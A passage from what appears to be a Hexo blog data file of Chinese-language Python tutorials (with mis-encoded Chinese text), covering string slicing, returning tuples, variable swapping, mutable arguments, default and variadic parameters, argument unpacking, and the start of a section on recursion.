type="1"><li>æˆªå–å®Œæ•´çš„å­—ç¬¦ä¸²</li></ol></li><li><ol start="5" type="1"><li>ä»å¼€å§‹ä½ç½®ï¼Œæ¯éš”ä¸€ä¸ªå­—ç¬¦æˆªå–å­—ç¬¦ä¸²</li></ol></li><li><ol start="6" type="1"><li>ä»ç´¢å¼• 1 å¼€å§‹ï¼Œæ¯éš”ä¸€ä¸ªå–ä¸€ä¸ª</li></ol></li><li><ol start="7" type="1"><li>æˆªå–ä» 2 ~ <code>æœ«å°¾ - 1</code> çš„å­—ç¬¦ä¸²</li></ol></li><li><ol start="8" type="1"><li>æˆªå–å­—ç¬¦ä¸²æœ«å°¾ä¸¤ä¸ªå­—ç¬¦</li></ol></li><li><ol start="9" type="1"><li>å­—ç¬¦ä¸²çš„é€†åºï¼ˆé¢è¯•é¢˜ï¼‰</li></ol></li></ul><p><strong>ç­”æ¡ˆ</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">num_str = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. æˆªå–ä» 2 ~ 5 ä½ç½® çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">2</span>:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æˆªå–ä» 2 ~ `æœ«å°¾` çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. æˆªå–ä» `å¼€å§‹` ~ 5 ä½ç½® çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(num_str[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. æˆªå–å®Œæ•´çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(num_str[:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. ä»å¼€å§‹ä½ç½®ï¼Œæ¯éš”ä¸€ä¸ªå­—ç¬¦æˆªå–å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(num_str[::<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. ä»ç´¢å¼• 1 å¼€å§‹ï¼Œæ¯éš”ä¸€ä¸ªå–ä¸€ä¸ª</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">1</span>::<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å€’åºåˆ‡ç‰‡</span></span><br><span class="line"><span class="comment"># -1 è¡¨ç¤ºå€’æ•°ç¬¬ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="built_in">print</span>(num_str[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. æˆªå–ä» 2 ~ `æœ«å°¾ - 1` çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. æˆªå–å­—ç¬¦ä¸²æœ«å°¾ä¸¤ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="built_in">print</span>(num_str[-<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. å­—ç¬¦ä¸²çš„é€†åºï¼ˆé¢è¯•é¢˜ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(num_str[<span class="number">0</span>::-<span class="number">1</span>])   <span class="comment"># ä» 0 å¼€å§‹ï¼Œæ­¥é•¿ä¸º -1ï¼Œ å‘å·¦åˆ‡ç‰‡ï¼Œåªä¼šæŠŠ 0 åˆ‡å‡ºæ¥</span></span><br><span class="line"><span class="built_in">print</span>(num_str[-<span class="number">1</span>::-<span class="number">1</span>])  <span class="comment"># ä»æœ€åä¸€ä¸ªå­—ç¬¦å¼€å§‹ï¼Œæ­¥é•¿ä¸º -1ï¼Œ è¿™æ ·å°±é€ æˆäº†é€†åº</span></span><br><span class="line"></span><br><span class="line">Finalï¼š</span><br><span class="line"><span class="built_in">print</span>(num_str[::-<span class="number">1</span>])<span class="comment"># ä¹‹å‰åœ¨å–å®Œæ•´å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå¼€å§‹å’Œç»“æŸç´¢å¼•éƒ½ä¸ç”¨æŒ‡å®šï¼Œå› æ­¤ï¼Œå­—ç¬¦ä¸²é€†åºçš„æ—¶å€™ï¼Œå¼€å§‹å’Œç»“æŸç´¢å¼•ä¹Ÿå¯ä»¥çœç•¥ã€‚</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> collections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python function</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/6.arg_return/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/6.arg_return/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿”å›å€¼">è¿”å›å€¼</h1><h2 id="è¿”å›å¤šä¸ªç»“æœ">è¿”å›å¤šä¸ªç»“æœ</h2><p>å…ƒç»„å¯ä»¥åŒ…å«é”å“¥æ•°æ®ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å…ƒç»„è®©å‡½æ•°ä¸€æ¬¡è¿”å›å¤šä¸ªå€¼ã€‚å¦‚æœå‡½æ•°è¿”å›çš„ç±»å‹æ˜¯å…ƒç»„ï¼Œå°æ‹¬å·å¯ä»¥çœç•¥ã€‚å³: æ¨èä½¿ç”¨<code>return a,b</code> æ›¿æ¢ <code>return (a,b)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">def</span>  <span class="title function_">test</span>():</span><br><span class="line">   ...:     a = <span class="number">1</span></span><br><span class="line">   ...:     b = <span class="number">2</span></span><br><span class="line">   ...:     <span class="keyword">return</span> a,b</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: a_out, b_out = test()</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: a_out</span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: b_out</span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: result = test()</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: <span class="built_in">type</span>(result)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="built_in">tuple</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="äº¤æ¢ä¸¤ä¸ªæ•°å­—-a-b">äº¤æ¢ä¸¤ä¸ªæ•°å­— a, b</h2><p>è§£æ³• 1ï¼šä½¿ç”¨ä¸´æ—¶å˜é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">14</span>]: c = a</span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: a = b</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: b = c</span><br></pre></td></tr></table></figure><p>è§£æ³•äºŒï¼šä¸é€‚ç”¨ä¸´æ—¶å˜é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">18</span>]: a = a + b</span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: b = a - b</span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: a = a - b</span><br></pre></td></tr></table></figure><p>è§£æ³•ä¸‰ï¼šPython ä¸“æœ‰ --æ¨è</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a, b = (b, a) ç­‰å·å³è¾¹æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œåªæ˜¯æŠŠå°æ‹¬å·çœç•¥äº†ã€‚</span></span><br><span class="line">a, b = b, a</span><br></pre></td></tr></table></figure><h1 id="å‡½æ•°å‚æ•°">å‡½æ•°å‚æ•°</h1><p>æ— è®ºä¼ é€’çš„å‚æ•°æ˜¯æ ‡ç¤ºå¯å˜å¯¹è±¡ï¼Œè¿˜æ˜¯ä¸å¯å˜å¯¹è±¡ï¼Œåªè¦é’ˆå¯¹åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨èµ‹å€¼è¯­å¥ï¼Œä¼šåœ¨å‡½æ•°å†…éƒ¨ä¿®æ”¹å±€éƒ¨å˜é‡çš„å¼•ç”¨ï¼Œä¸ä¼šå½±å“åˆ°å¤–éƒ¨å˜é‡çš„å¼•ç”¨ã€‚å› ä¸ºèµ‹å€¼å°±ç›´æ¥æ”¹å˜äº†å˜é‡ä¸å¯¹è±¡çš„ç»‘å®šã€‚</p><h2 id="section">+=</h2><p>å¯¹ä¸€èˆ¬å¯¹è±¡è€Œè¨€ï¼Œ <code>+=</code> å°±æ˜¯ <code>xx = xx + varible</code>, è€Œåˆ—è¡¨å˜é‡ä½¿ç”¨ <code>+=</code> , å³: <code>num_list += 1</code> ï¼Œä¸ä¼šåšç›¸åŠ å†èµ‹å€¼çš„æ“ä½œï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨è°ƒç”¨åˆ—è¡¨çš„ extend æ–¹æ³•ï¼Œå› æ­¤ï¼Œå®ƒæ²¡æœ‰åƒ<code>num_list = num_list + [4,5]</code>èµ‹å€¼æ“ä½œè¿™æ ·ï¼Œä¿®æ”¹å˜é‡ä¸å¯¹è±¡çš„ç»‘å®šï¼Œæ‰€ä»¥ï¼Œå®é™…ä¸Šå®ƒæ“ä½œçš„æ˜¯å¤–éƒ¨ä¼ è¿›çš„å‚æ•°ç»‘å®šçš„å¯¹è±¡(å³:å¯ä»¥å¯¹ä¼ è¿›çš„å¤–éƒ¨åˆ—è¡¨å¯¹è±¡è¿›è¡Œä¿®æ”¹)ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">30</span>]: num_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">In [<span class="number">31</span>]: <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num_list</span>):</span><br><span class="line">    ...:     num_list += [<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: test(num_list)</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: num_list</span><br><span class="line">Out[<span class="number">33</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="comment"># å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨ += é€šè¿‡ extend å®é™…ä¸Šæ“ä½œçš„æ˜¯å’Œå¤–éƒ¨ç»‘å®šçš„åŒä¸€ä¸ªåˆ—è¡¨å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: num_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">35</span>]: <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">num_list</span>):</span><br><span class="line">    ...:     num_list = num_list + [<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: test(num_list)</span><br><span class="line"></span><br><span class="line">In [<span class="number">37</span>]: num_list</span><br><span class="line">Out[<span class="number">37</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="comment"># å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨ = èµ‹å€¼ï¼Œé‡æ–°å°† num_list å˜é‡ç»‘å®šåˆ°äº†ä¸€ä¸ªæ–°çš„åˆ—è¡¨(num_list + [4,5]) ä¸Šï¼Œå¯¹å¤–éƒ¨å˜é‡çš„ç»‘å®šå¯¹è±¡æ²¡æœ‰å½±å“ã€‚</span></span><br></pre></td></tr></table></figure><h2 id="ç¼ºçœå‚æ•°">ç¼ºçœå‚æ•°</h2><ul><li>å®šä¹‰å‡½æ•°æ—¶ï¼Œå¯ä»¥ç»™æŸä¸ªå‚æ•°æŒ‡å®šä¸€ä¸ªé»˜è®¤å€¼ï¼Œå…·æœ‰é»˜è®¤å€¼çš„å‚æ•°å°±å«åšç¼ºçœå‚æ•°</li><li>è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä¼ å…¥ç¼ºçœå‚æ•°çš„å€¼ï¼Œåˆ™åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨å®šä¹‰å‡½æ•°æ—¶æŒ‡å®šçš„å‚æ•°é»˜è®¤å€¼</li><li>å‡½æ•°çš„ç¼ºçœå‚æ•°ï¼Œå°†å¸¸è§çš„å€¼è®¾ç½®ä¸ºå‚æ•°çš„ç¼ºçœå€¼ï¼Œä»è€Œç®€åŒ–å‡½æ•°çš„è°ƒç”¨</li><li>ä¾‹å¦‚ï¼šå¯¹åˆ—è¡¨æ’åºçš„æ–¹æ³•ï¼š <code>list.sort()</code> æœ‰ä¸€ä¸ª reverseå‚æ•°é»˜è®¤ä¸º falseï¼Œå‡åºæ’åºã€‚</li></ul><h3 id="æŒ‡å®šå‡½æ•°çš„ç¼ºçœå‚æ•°">æŒ‡å®šå‡½æ•°çš„ç¼ºçœå‚æ•°</h3><ul><li>åœ¨å‚æ•°åä½¿ç”¨èµ‹å€¼è¯­å¥ï¼Œå¯ä»¥æŒ‡å®šå‚æ•°çš„ç¼ºçœå€¼</li></ul><p>æç¤º</p><pre><code>1. ç¼ºçœå‚æ•°ï¼Œéœ€è¦ä½¿ç”¨æœ€å¸¸è§çš„å€¼ä½œä¸ºé»˜è®¤å€¼ï¼2. å¦‚æœä¸€ä¸ªå‚æ•°çš„å€¼ä¸èƒ½ç¡®å®šï¼Œåˆ™ä¸åº”è¯¥è®¾ç½®é»˜è®¤å€¼ï¼Œå…·ä½“çš„æ•°å€¼åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œç”±å¤–ç•Œä¼ é€’ï¼</code></pre><p>ç¼ºçœå‚æ•°çš„æ³¨æ„äº‹é¡¹</p><ol type="1"><li><p>ç¼ºçœå‚æ•°çš„å®šä¹‰ä½ç½®</p><ul><li>å¿…é¡»ä¿è¯å¸¦æœ‰é»˜è®¤å€¼çš„ç¼ºçœå‚æ•°åœ¨å‚æ•°åˆ—è¡¨æœ«å°¾</li><li>æ‰€ä»¥ï¼Œä»¥ä¸‹å®šä¹‰æ˜¯é”™è¯¯çš„ï¼</li></ul><p><code>def print_info(name, gender=True, title):</code></p></li><li><p>è°ƒç”¨å¸¦æœ‰å¤šä¸ªç¼ºçœå‚æ•°çš„å‡½æ•°</p></li></ol><ul><li>åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œ<strong>å¦‚æœæœ‰å¤šä¸ªç¼ºçœå‚æ•°ï¼Œéœ€è¦æŒ‡å®šå‚æ•°å</strong>ï¼Œè¿™æ ·è§£é‡Šå™¨æ‰èƒ½å¤ŸçŸ¥é“å‚æ•°çš„å¯¹åº”å…³ç³»ï¼</li></ul><h2 id="å¤šå€¼å‚æ•°å¯å˜å‚æ•°">å¤šå€¼å‚æ•°(å¯å˜å‚æ•°)</h2><h3 id="å®šä¹‰æ”¯æŒå¤šå€¼å‚æ•°çš„å‡½æ•°">å®šä¹‰æ”¯æŒå¤šå€¼å‚æ•°çš„å‡½æ•°</h3><ul><li><p>æœ‰æ—¶å¯èƒ½éœ€è¦ä¸€ä¸ªå‡½æ•°èƒ½å¤Ÿå¤„ç†çš„å‚æ•°ä¸ªæ•°æ˜¯ä¸ç¡®å®šçš„ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±å¯ä»¥ä½¿ç”¨å¤šå€¼å‚æ•°</p></li><li><p>python ä¸­æœ‰ä¸¤ç§å¤šå€¼å‚æ•°ï¼š</p><p>å‚æ•°åå‰å¢åŠ ä¸€ä¸ª <code>*</code> å¯ä»¥æ¥æ”¶å…ƒç»„ å‚æ•°åå‰å¢åŠ ä¸¤ä¸ª<code>*</code> å¯ä»¥æ¥æ”¶å­—å…¸</p></li><li><p>ä¸€èˆ¬åœ¨ç»™å¤šå€¼å‚æ•°å‘½åæ—¶ï¼Œä¹ æƒ¯ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªåå­—</p><ul><li><code>*args</code> --å­˜æ”¾å…ƒç»„å‚æ•°ï¼Œå‰é¢æœ‰ä¸€ä¸ª <code>*</code></li><li><code>**kwargs</code> --å­˜æ”¾å­—å…¸å‚æ•°ï¼Œå‰é¢æœ‰ä¸¤ä¸ª <code>*</code></li></ul></li><li><p><code>args</code> æ˜¯ <code>arguments</code>çš„ç¼©å†™ï¼Œæœ‰å˜é‡çš„å«ä¹‰</p></li><li><p><code>kw</code> æ˜¯ <code>keyword</code> çš„ç¼©å†™ï¼Œ<code>kwargs</code> å¯ä»¥è®°å¿†é”®å€¼å¯¹å‚æ•°</p></li></ul><p>æç¤ºï¼šå¤šå€¼å‚æ•°çš„åº”ç”¨ä¼šç»å¸¸å‡ºç°åœ¨ç½‘ç»œä¸Šä¸€äº›å¤§ç‰›å¼€å‘çš„æ¡†æ¶ä¸­ï¼ŒçŸ¥é“å¤šå€¼å‚æ•°ï¼Œæœ‰åˆ©äºæˆ‘ä»¬èƒ½å¤Ÿè¯»æ‡‚å¤§ç‰›çš„ä»£ç </p><p>ä»£ç ç¤ºä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">39</span>]: <span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">num, *nums, **person</span>):</span><br><span class="line">    ...:     <span class="built_in">print</span>(num)</span><br><span class="line">    ...:     <span class="built_in">print</span>(nums)</span><br><span class="line">    ...:     <span class="built_in">print</span>(person)</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: demo(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: demo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">&#123;&#125;</span><br><span class="line">In [<span class="number">42</span>]: demo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,name=<span class="string">&quot;å°æ˜&quot;</span>, age=<span class="number">14</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;å°æ˜&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">14</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¡ˆä¾‹-è®¡ç®—ä»»æ„å¤šä¸ªæ•°å­—çš„å’Œ">æ¡ˆä¾‹: è®¡ç®—ä»»æ„å¤šä¸ªæ•°å­—çš„å’Œ</h3><p>éœ€æ±‚:</p><ol type="1"><li>å®šä¹‰ä¸€ä¸ªå‡½æ•° <code>sum_numbers</code> , å¯ä»¥æ¥æ”¶çš„ä»»æ„å¤šä¸ªæ•´æ•°</li><li>åŠŸèƒ½è¦æ±‚: å°†ä¼ é€’çš„æ‰€æœ‰æ•°å­—ç´¯åŠ ï¼Œå¹¶ä¸”è¿”å›ç´¯åŠ ç»“æœã€‚</li></ol><p>å¦‚æœä¸ä½¿ç”¨å¯å˜å‚æ•°ï¼Œå³: ä½¿ç”¨å…ƒç»„è¾¾åˆ°ä¼ é€’å¤šå€¼çš„æ•ˆæœï¼Œä»£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sum_numbers</span>(<span class="params">args</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¾ªç¯éå†</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">        num += n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">result = sum_numbers((<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))<span class="comment"># è¿™é‡Œè¦å¤šå†™æ‹¬å·ï¼Œä½¿å…¶æˆä¸ºå…ƒç»„ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨å¯å˜å‚æ•°ï¼Œä»£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sum_numbers</span>(<span class="params">*args</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¾ªç¯éå†</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">        num += n</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">result = sum_numbers(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œä¼ å‚çš„æ—¶å€™å°±æ–¹ä¾¿ç®€æ´å¤šäº†ã€‚</p><h3 id="ä¼ å‚ä¸­çš„æ‹†åŒ…">ä¼ å‚ä¸­çš„æ‹†åŒ…</h3><ul><li>åœ¨è°ƒç”¨å¸¦æœ‰å¤šå€¼å‚æ•°çš„å‡½æ•°æ—¶ï¼Œå¦‚æœå¸Œæœ›ï¼š<ul><li>å°†ä¸€ä¸ªå…ƒç»„å˜é‡ï¼Œç›´æ¥ä¼ é€’ç»™ <code>args</code></li><li>å°†ä¸€ä¸ªå­—å…¸å˜é‡ï¼Œç›´æ¥ä¼ é€’ç»™ <code>kwdrgs</code></li></ul></li><li>å°±å¯ä»¥ä½¿ç”¨æ‹†åŒ…ï¼Œç®€åŒ–å‚æ•°çš„ä¼ é€’ï¼Œæ‹†åŒ…çš„æ–¹å¼æ˜¯ï¼š<ul><li>åœ¨å…ƒç»„å˜é‡å‰ï¼Œå¢åŠ ä¸€ä¸ª <code>*</code></li><li>åœ¨å­—å…¸å˜é‡å‰ï¼Œå¢åŠ ä¸¤ä¸ª <code>*</code></li></ul></li><li>åœ¨æ ¼å¼åŒ–è¾“å‡ºçš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‹†åŒ…æ¯”å¦‚ï¼š<code>print("%d %d" % hero_rect.size)</code> ç›´æ¥å°†å«æœ‰ä¸¤ä¸ª numberçš„å…ƒç»„è¿›è¡Œæ‹†åŒ…è¾“å‡ºã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line"></span><br><span class="line"><span class="comment">#éœ€è¦å°†ä¸€ä¸ªå…ƒç»„å˜é‡/å­—å…¸å˜é‡ä¼ é€’ç»™å‡½æ•°å¯¹åº”çš„å‚æ•°</span></span><br><span class="line"></span><br><span class="line">gl_nums = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">gl_dict = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¼šæŠŠ gl_nums å’Œ gl_dict ä½œä¸ºå…ƒç¥–ä¼ é€’ç»™ args</span></span><br><span class="line"><span class="comment"># demo(gl_nums, gl_dict)</span></span><br><span class="line"><span class="comment"># OUTPUT:</span></span><br><span class="line"><span class="comment"># ((1, 2, 3), &#123;&#x27;name&#x27;: &#x27;xiaoming&#x27;, &#x27;age&#x27;: 18&#125;)</span></span><br><span class="line"><span class="comment"># &#123;&#125;</span></span><br><span class="line"></span><br><span class="line">demo(*gl_nums, **gl_dict)</span><br></pre></td></tr></table></figure><p>è¾“å‡º:</p><blockquote><p>(1, 2, 3)</p></blockquote><p>{'name': 'xiaoming', 'age': 18}</p><h1 id="é€’å½’">é€’å½’</h1><p>Be aware that recursion really isnâ€™t a strong Python feature duetothe inherent recursion limit</p><p>ç‰¹ç‚¹ï¼š</p><ul><li>ä¸€ä¸ªå‡½æ•°å†…éƒ¨è°ƒç”¨è‡ªå·±<ul><li>ä¸€ä¸ªå‡½æ•°å†…éƒ¨å¯ä»¥è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œå½“ç„¶ï¼Œåœ¨å‡½æ•°å†…éƒ¨ä¹Ÿå¯ä»¥è°ƒç”¨è‡ªå·±</li></ul></li></ul><p>ä»£ç ç‰¹ç‚¹ï¼š</p><ol type="1"><li>å‡½æ•°å†…éƒ¨ä»£ç æ˜¯ç›¸åŒçš„ï¼Œåªæ˜¯é’ˆå¯¹å‚æ•°ä¸åŒï¼Œå¤„ç†ç»“æœä¸åŒ</li><li>å½“å‚æ•°æ»¡è¶³ä¸€ä¸ªæ¡ä»¶æ—¶ï¼Œå‡½æ•°ä¸å†æ‰§è¡Œ<ul><li>è¿™ä¸ªéå¸¸é‡è¦ï¼Œé€šå¸¸è¢«ç§°ä¸º<strong>é€’å½’çš„å‡ºå£</strong>ï¼Œå¦åˆ™ä¼šå‡ºç°æ­»å¾ªç¯</li></ul></li><li>ç¼–å†™é€’å½’ç¨‹åºæ—¶ï¼Œå…³é”®ä¸¤ç‚¹:<ol 